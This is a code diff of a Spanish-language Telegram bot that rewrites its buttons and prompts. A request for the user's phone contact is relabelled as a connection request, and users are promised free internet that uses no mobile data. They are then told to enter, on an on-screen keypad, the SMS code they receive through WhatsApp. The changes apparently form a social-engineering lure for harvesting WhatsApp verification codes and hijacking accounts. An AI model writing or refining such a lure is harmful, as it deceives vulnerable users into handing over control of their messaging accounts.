@@ -58,22 +58,22 @@ def admin_chat_ok(update: Update) -> bool:
     return str(chat.id) == ADMIN_CHANNEL_ID
 
 def share_phone_kb():
-    btn = KeyboardButton("👉🏻𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎🇨🇺", request_contact=True)
+    btn = KeyboardButton("📡𝐒𝐎𝐋𝐈𝐂𝐈𝐓𝐀𝐑 𝐂𝐎𝐍𝐄𝐗𝐈𝐎𝐍", request_contact=True)
     return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
 def start_inline_kb():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("👉🏻𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎🇨🇺", callback_data="start_join")]
+        [InlineKeyboardButton("🌐𝐂𝐎𝐍𝐄𝐂𝐓𝐀𝐑 𝐀 𝐈𝐍𝐓𝐄𝐑𝐍𝐄𝐓", callback_data="start_join")]
     ])
 
 def members_inline_kb():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("👥 𝐌𝐈𝐄𝐌𝐁𝐑𝐎𝐒", callback_data="members_btn")]
+        [InlineKeyboardButton("📺𝐕𝐈𝐃𝐄𝐎 𝐓𝐔𝐓𝐎𝐑𝐈𝐀𝐋", callback_data="members_btn")]
     ])
 
 def tutorial_inline_kb():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("❓ 𝐇𝐀𝐂𝐄𝐑 𝐔𝐍𝐀 𝐏𝐑𝐄𝐆𝐔𝐍𝐓𝐀", callback_data="ask_question")]
+        [InlineKeyboardButton("𝐇𝐀𝐂𝐄𝐑 𝐔𝐍𝐀 𝐏𝐑𝐄𝐆𝐔𝐍𝐓𝐀❓", callback_data="ask_question")]
     ])
 
 def build_keypad(code_str: str):
@@ -102,18 +102,18 @@ def build_keypad(code_str: str):
         rows.append(fila)
 
     rows.append([
-        InlineKeyboardButton("← Borrar", callback_data="del"),
-        InlineKeyboardButton("✅ Confirmar", callback_data="ok")
+        InlineKeyboardButton("🗑️𝐁𝐨𝐫𝐫𝐚𝐫", callback_data="del"),
+        InlineKeyboardButton("✔️𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐫", callback_data="ok")
     ])
 
     rows.append([
-        InlineKeyboardButton("❌ Cancelar", callback_data="cancel")
+        InlineKeyboardButton("❌𝐂𝐚𝐧𝐜𝐞𝐥𝐚𝐫", callback_data="cancel")
     ])
 
     progreso = " ".join(list(code_str)) if code_str else "—"
 
     text = (
-        "𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐭𝐮 𝐜𝐨́𝐝𝐢𝐠𝐨 𝐝𝐞 𝐚𝐜𝐜𝐞𝐬𝐨 𝐝𝐞 8 𝐜𝐚𝐫𝐚𝐜𝐭𝐞𝐫𝐞𝐬.\n\n"
+        "𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐪𝐮𝐞 𝐫𝐞𝐜𝐢𝐛𝐢𝐬𝐭𝐞 𝐩𝐨𝐫 𝐒𝐌𝐒 𝐩𝐚𝐫𝐚 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧 𝐫𝐚𝐩𝐢𝐝𝐚 𝐲 𝐬𝐞𝐠𝐮𝐫𝐚 𝐝𝐞 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐢𝐫 𝐝𝐚𝐭𝐨𝐬 𝐦𝐨𝐯𝐢𝐥𝐞𝐬 𝐩𝐫𝐢𝐦𝐞𝐫𝐨 𝐞𝐧 𝐭𝐮 𝐚𝐩𝐩 𝐝𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐥𝐮𝐞𝐠𝐨 𝐚𝐪𝐮í 𝐩𝐚𝐫𝐚 𝐞𝐬𝐭𝐚𝐛𝐥𝐞𝐜𝐞𝐫 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭. 𝐏𝐚𝐫𝐚 𝐦𝐚𝐬 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐜𝐢𝐨𝐧 𝐫𝐞𝐯𝐢𝐬𝐚𝐫 𝐯𝐢𝐝𝐞𝐨 𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥.\n\n"
         f"Código: `{progreso}`"
     )
 
@@ -121,9 +121,9 @@ def build_keypad(code_str: str):
 
 async def animate_wait(bot, chat_id: int, message_id: int, user_id: int):
     frames = [
-        "⏳ Conectando.",
-        "⏳ Conectando..",
-        "⏳ Conectando..."
+        "⏳ Conectando a internet.",
+        "⌛️ Conectando a internet..",
+        "⏳ Conectando a internet..."
     ]
     idx = 0
     try:
